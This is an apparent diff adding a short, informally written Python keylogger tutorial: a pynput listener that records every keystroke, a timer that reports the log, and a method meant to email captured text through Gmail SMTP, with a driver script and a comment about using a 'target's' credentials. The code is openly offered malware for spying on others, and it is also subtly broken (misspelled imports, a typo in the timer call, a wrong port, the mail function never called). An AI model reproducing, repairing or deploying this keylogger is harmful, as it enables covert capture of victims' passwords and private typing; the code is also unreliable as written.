@@ -1,0 +1,41 @@
+### for finding keylogger u need to write another code also
+1.import pynput.keyboard
+import threading
+import smptlib
+class Keylogger:
+  def __init__(self, time_interval, email, password):
+     self.log = "keylogger started"
+     self.interval=time_interval
+     self.email=email
+     self.password=password
+  def append_to_log(self,string):
+     self.log=self.log + string
+  def process_key_press(self, key):
+     try:
+         current_key=str(key.char)
+     except AttributeError:
+         if key == key.space:
+            current_key=" "
+         else:
+            current_key=" " + str(key) + " "
+     self.append_to_log(current_key)
+  def report(self):
+     print(self.log)
+     self.log=" "
+     timer=threading.Timer(self.interval,sself.report)
+     timer.start()
+  def start(self):
+     keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+     with keyboard_listener:
+        self.report()
+        keyboard_listener.join()
+  def send_mail(self, email, password, message):
+     server=smtplib.SMTP("smtp.gmail.com", 590) # i have given sample userid, password u can give your targets credentials
+     server.starttls()
+     server.login(email, password)
+     server.sendmail(email, email, message)
+     server.quit()
+2.import keylogger
+my_keylogger=keylogger.Keylogger(120,"ur mail id ","password")
+my_keylogger.start()
+/!!!@@@#### when u want to execute your program you have to execute 2nd one nlot first  because we are calling the class that is defined in our 1st prgm into second program using objects
